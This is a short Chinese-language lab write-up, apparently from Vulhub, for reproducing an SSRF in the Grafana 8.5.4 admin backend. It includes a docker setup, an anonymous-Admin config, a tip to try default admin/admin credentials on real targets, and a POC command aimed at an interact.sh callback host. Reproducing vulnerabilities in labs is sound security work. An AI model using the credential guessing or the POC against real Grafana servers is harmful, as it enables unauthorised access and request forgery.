# Grafana管理后台SSRF

## 漏洞环境

执行如下命令启动一个Grafana 8.5.4：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:3000即可查看到管理后台。这个管理后台是不需要登录的，因为Vulhub环境设置了匿名用户的权限：

[auth.anonymous]

enabled= true

org_role = Admin

在真实场景中，如果你没有权限访问管理界面，可以尝试使用默认账号密码admin和admin，只能能够成功登录后台的用户才能利用这个漏洞。

## 漏洞复现

使用[这个POC](https://github.com/RandomRobbieBF/grafana-ssrf#tdsub)来复现SSRF漏洞：

https://dnslog.org

```plain
python grafana-ssrf.py -H http://your-ip:3000 -u http://example.interact.sh/attack
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780876708342-7f2d3d35-5e7a-450b-9306-74a6bd8489bb.png)

可见，我们的反连平台已成功收到了HTTP请求：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780876708331-b90d6c03-4e5b-4a3b-bd47-59105ce3a16f.png)